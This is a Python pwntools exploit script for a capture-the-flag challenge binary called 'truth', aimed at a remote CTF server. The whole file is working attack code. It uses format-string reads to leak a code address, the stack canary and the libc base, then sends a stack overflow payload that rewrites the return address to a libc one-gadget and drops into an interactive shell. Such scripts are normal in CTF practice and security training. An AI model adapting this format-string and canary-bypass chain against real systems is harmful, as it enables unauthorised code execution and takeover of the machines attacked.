#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 0

if local:
	cn = process('./truth')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	cn = remote('ctf.qiuyitech.com',6667)
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()


cn.sendafter('What\'s your name:','/bin/sh\x00')
cn.recvuntil('.')
base = int(cn.recvline()[:-1]) - 0xAA0
cn.sendafter('There is only one truth.','a'*0x30+p32(0x2333))
cn.sendafter('You are just repeater!','%7$p')
cn.recvuntil('0x')
a = int('0x'+cn.recv(8),16)+0x1234
print(hex(a))
cn.sendafter('What this?',p32(0x6666)*12+p32(a))
cn.sendafter('Pay for past debts.','%11$p')
canary = int(cn.recvuntil('your ')[:-5],16)
print(hex(canary))
buf = 'a'*0x30+p32(0x2333)
buf+= p32(0) + p64(canary) + 'b'*8
buf+= p64(base+0xD64)[:2]
cn.sendafter('There is only one truth.',buf)

cn.sendafter('What\'s your name:','/bin/sh\x00')
cn.sendafter('There is only one truth.','a'*0x30+p32(0x2333))
cn.sendafter('You are just repeater!','%7$p')
cn.recvuntil('0x')
a = int('0x'+cn.recv(8),16)+0x1234
print(hex(a))
cn.sendafter('What this?',p32(0x6666)*12+p32(a))
cn.sendafter('Pay for past debts.','%28$p')
lbase = int(cn.recvuntil('your ')[:-5],16) - 0x20830
print(hex(lbase))
buf = 'a'*0x30+p32(0x2333)
buf+= p32(0) + p64(canary) + 'b'*8
buf+= p64(lbase + 0x45216)
cn.sendafter('There is only one truth.',buf)

cn.interactive()
